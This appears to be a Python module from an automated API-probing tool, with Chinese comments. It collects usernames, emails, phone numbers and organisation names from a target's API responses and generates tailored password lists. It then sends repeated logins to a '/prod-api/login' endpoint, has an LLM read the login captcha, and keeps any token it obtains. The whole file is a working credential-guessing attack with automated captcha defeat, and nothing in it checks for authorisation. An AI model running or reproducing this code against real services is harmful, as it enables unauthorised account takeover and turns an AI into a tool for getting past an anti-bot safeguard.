"""
Intelligent API Discovery - Auth Bypass Module

智能弱口令探测模块

功能：
1. 从探测响应中提取可能的用户名/手机号
2. 根据目标信息生成定制化密码
3. 使用 LLM 识别验证码图片
4. 结合常规弱口令进行测试
5. 获取 token 后继续探测
"""

import requests
import base64
import io
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime

from .models import AuthInfo


class AuthBypass:
    """
    智能弱口令探测
    
    从已发现的端点和响应中提取信息，生成定制化密码进行测试
    使用 LLM 视觉能力识别验证码
    """
    
    # 常规弱口令
    COMMON_PASSWORDS = [
        "123456", "password", "12345678", "admin", "admin123",
        "123456789", "1234567890", "123123", "123321",
        "000000", "111111", "666666", "888888",
        "qwerty", "abc123", "abcdef", "abcd1234",
        "password123", "P@ssw0rd", "P@ssword", "Pass123",
        "root", "toor", "administrator", "admin888",
        "test", "test123", "guest", "guest123",
        "admin123456", "admin666", "admin888",
        "123456a", "123456A", "123456@",
        "qwer1234", "asdf1234", "zxcv1234",
    ]
    
    # 用户名变体
    USERNAME_VARIATIONS = [
        "admin", "administrator", "root", "user", "test",
        "guest", "operator", "manager", "supervisor",
    ]
    
    def __init__(self, target: str, session: requests.Session = None, llm_client=None):
        """
        初始化认证绕过模块
        
        Args:
            target: 目标 URL
            session: requests Session
            llm_client: LLM 客户端（用于验证码识别）
        """
        self.target = target.rstrip('/')
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.llm_client = llm_client
        
        self.discovered_info: Dict[str, Set[str]] = {
            'usernames': set(),
            'emails': set(),
            'phones': set(),
            'org_names': set(),
            'admin_names': set(),
        }
        
        self.auth_result: Optional[Dict] = None
        self.token: Optional[str] = None
        self.captcha_uuid: Optional[str] = None
    
    def extract_info_from_responses(self, responses: List[Dict]):
        """从 API 响应中提取有用信息"""
        for resp_data in responses:
            if isinstance(resp_data, dict):
                self._extract_from_dict(resp_data)
    
    def _extract_from_dict(self, data: Dict, path: str = ""):
        """递归提取字典中的信息"""
        for key, value in data.items():
            key_lower = key.lower()
            
            if any(k in key_lower for k in ['username', 'user_name', 'login', 'account', 'nickname', 'admin']):
                if isinstance(value, str) and len(value) > 0:
                    self.discovered_info['usernames'].add(value)
            
            if any(k in key_lower for k in ['email', 'mail']):
                if isinstance(value, str) and '@' in value:
                    self.discovered_info['emails'].add(value)
                    username = value.split('@')[0]
                    self.discovered_info['usernames'].add(username)
            
            if any(k in key_lower for k in ['phone', 'mobile', 'tel']):
                if isinstance(value, str):
                    phone = ''.join(c for c in value if c.isdigit())
                    if len(phone) >= 11:
                        self.discovered_info['phones'].add(phone)
            
            if any(k in key_lower for k in ['admin_name', 'adminname', 'realname', 'nick_name']):
                if isinstance(value, str):
                    self.discovered_info['admin_names'].add(value)
            
            if any(k in key_lower for k in ['org_name', 'orgname', 'company', 'dept_name', 'deptname']):
                if isinstance(value, str):
                    self.discovered_info['org_names'].add(value)
            
            if isinstance(value, dict):
                self._extract_from_dict(value, f"{path}.{key}")
            elif isinstance(value, list) and len(value) > 0:
                for item in value[:5]:
                    if isinstance(item, dict):
                        self._extract_from_dict(item, f"{path}.{key}")
    
    def generate_passwords(self) -> List[str]:
        """生成密码字典"""
        passwords = set()
        
        passwords.update(self.COMMON_PASSWORDS)
        
        for org in self.discovered_info['org_names']:
            org_lower = org.lower()
            org_upper = org.upper()
            org_short = ''.join(c for c in org if c.isalnum())[:4]
            
            passwords.update([
                org_lower, org_lower + "123", org_lower + "123456",
                org_upper, org_upper + "123",
                org_short + "123", org_short + "123456",
                org + "2024", org + "2023", org + "666",
            ])
        
        for admin in self.discovered_info['admin_names']:
            admin_lower = admin.lower()
            passwords.update([
                admin_lower, admin_lower + "123", admin_lower + "123456", admin_lower + "@123",
            ])
        
        for username in self.discovered_info['usernames']:
            username_lower = username.lower()
            passwords.update([
                username_lower, username_lower + "123", username_lower + "123456", username_lower + "@123",
            ])
        
        for phone in self.discovered_info['phones']:
            passwords.update([
                phone[-6:], phone[-8:], phone + "123", "1" + phone[-6:],
            ])
        
        target_short = self._extract_target_short()
        if target_short:
            passwords.update([
                target_short, target_short + "123", target_short + "123456",
                target_short + "@123", target_short + "666", target_short + "admin",
            ])
        
        return list(passwords)
    
    def _extract_target_short(self) -> str:
        """提取目标名称缩写"""
        url_parts = self.target.replace('http://', '').replace('https://', '').split('/')
        host = url_parts[0]
        domain_parts = host.split('.')
        if len(domain_parts) >= 2:
            main_name = domain_parts[-2]
            short = ''.join(c for c in main_name if c.isalpha())
            if len(short) >= 2:
                return short
        return ""
    
    def generate_usernames(self) -> List[str]:
        """生成可能的用户名列表"""
        usernames = set()
        
        usernames.update(self.discovered_info['usernames'])
        usernames.update(self.USERNAME_VARIATIONS)
        
        for email in self.discovered_info['emails']:
            username = email.split('@')[0]
            usernames.add(username)
        
        for phone in self.discovered_info['phones']:
            usernames.add(phone)
            if len(phone) > 8:
                usernames.add(phone[-8:])
        
        for org in self.discovered_info['org_names']:
            org_lower = org.lower()
            usernames.add(org_lower)
            usernames.add("admin")
            usernames.add("system")
        
        return list(usernames)
    
    async def try_login(self, login_url: str = None) -> Tuple[bool, str]:
        """尝试登录"""
        if not login_url:
            login_url = self.target + "/prod-api/login"
        
        print(f"\n[*] Starting auth bypass...")
        print(f"    Login URL: {login_url}")
        print(f"    Discovered: {self._summarize_info()}")
        
        usernames = self.generate_usernames()
        passwords = self.generate_passwords()
        
        print(f"    Generated {len(usernames)} usernames, {len(passwords)} passwords")
        
        # 获取验证码
        captcha_url = self.target + "/prod-api/captchaImage"
        captcha_text = ""
        captcha_uuid = ""
        
        try:
            resp = self.session.get(captcha_url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('code') == 200 and data.get('data'):
                    captcha_uuid = data['data'].get('uuid', '')
                    captcha_base64 = data['data'].get('img', '')
                    if captcha_base64 and self.llm_client:
                        print(f"    [*] Recognizing captcha with LLM...")
                        captcha_text = await self._recognize_captcha(captcha_base64)
                        print(f"    [*] Captcha recognized: {captcha_text}")
                    elif captcha_base64:
                        # 不用 LLM，直接尝试空验证码
                        captcha_text = ""
        except Exception as e:
            print(f"    [!] Captcha fetch failed: {e}")
        
        # 尝试无验证码登录
        print(f"\n[*] Trying without captcha...")
        for username in usernames[:15]:
            for password in self.COMMON_PASSWORDS[:15]:
                success, result = await self._try_login(login_url, username, password, "", "")
                if success:
                    self.auth_result = {'username': username, 'password': password}
                    self.token = result
                    print(f"\n[!] LOGIN SUCCESS!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    return True, result
        
        # 尝试有验证码登录
        if captcha_text and captcha_uuid:
            print(f"\n[*] Trying with captcha: {captcha_text}...")
            for username in usernames[:10]:
                for password in self.COMMON_PASSWORDS[:20]:
                    success, result = await self._try_login(login_url, username, password, captcha_text, captcha_uuid)
                    if success:
                        self.auth_result = {'username': username, 'password': password}
                        self.token = result
                        print(f"\n[!] LOGIN SUCCESS with captcha!")
                        print(f"    Username: {username}")
                        print(f"    Password: {password}")
                        return True, result
        
        # 尝试定制化密码
        print(f"\n[*] Trying customized passwords...")
        for username in usernames[:10]:
            for password in passwords[:30]:
                if password in self.COMMON_PASSWORDS:
                    continue
                success, result = await self._try_login(login_url, username, password, "", "")
                if success:
                    self.auth_result = {'username': username, 'password': password}
                    self.token = result
                    print(f"\n[!] LOGIN SUCCESS!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    return True, result
        
        print(f"\n[*] Auth bypass completed, no valid credentials found")
        return False, ""
    
    async def _recognize_captcha(self, base64_image: str) -> str:
        """使用 LLM 识别验证码"""
        if not self.llm_client:
            return ""
        
        try:
            prompt = """这是一个验证码图片，请只返回验证码文字，不要返回其他内容。验证码通常是4-6个字符，可能包含字母和数字。"""
            
            response = self.llm_client.generate_with_image(
                prompt=prompt,
                image_base64=base64_image
            )
            
            if response:
                # 提取验证码文字
                captcha = response.strip()
                # 清理非字母数字字符
                captcha = ''.join(c for c in captcha if c.isalnum())
                return captcha[:6]
        except Exception as e:
            print(f"    [!] LLM captcha recognition failed: {e}")
        
        return ""
    
    async def _try_login(
        self, 
        login_url: str, 
        username: str, 
        password: str,
        captcha: str = "",
        uuid: str = ""
    ) -> Tuple[bool, str]:
        """尝试单次登录"""
        try:
            data = {
                "username": username,
                "password": password,
                "code": captcha,
                "uuid": uuid
            }
            
            resp = self.session.post(login_url, json=data, timeout=10)
            
            if resp.status_code == 200:
                try:
                    result = resp.json()
                    if result.get('code') == 200:
                        token = result.get('data', {}).get('token')
                        if token:
                            return True, token
                    elif result.get('msg'):
                        if '验证码' in result.get('msg', ''):
                            print(f"    [!] Captcha error: {result.get('msg')}")
                        elif '账户' in result.get('msg', '') or '密码' in result.get('msg', ''):
                            print(f"    [*] Invalid: {username}/{password}")
                except:
                    pass
        except Exception as e:
            pass
        
        return False, ""
    
    def _summarize_info(self) -> str:
        """总结发现的信息"""
        parts = []
        if self.discovered_info['usernames']:
            parts.append(f"{len(self.discovered_info['usernames'])} usernames")
        if self.discovered_info['phones']:
            parts.append(f"{len(self.discovered_info['phones'])} phones")
        if self.discovered_info['org_names']:
            parts.append(f"{len(self.discovered_info['org_names'])} orgs")
        if self.discovered_info['admin_names']:
            parts.append(f"{len(self.discovered_info['admin_names'])} admin names")
        return ", ".join(parts) if parts else "none"
    
    def get_auth_headers(self) -> Dict[str, str]:
        """获取认证头"""
        if self.token:
            return {'Authorization': 'Bearer ' + self.token}
        return {}


def create_auth_bypass(target: str, session=None, llm_client=None) -> AuthBypass:
    """创建认证绕过模块"""
    return AuthBypass(target, session, llm_client)
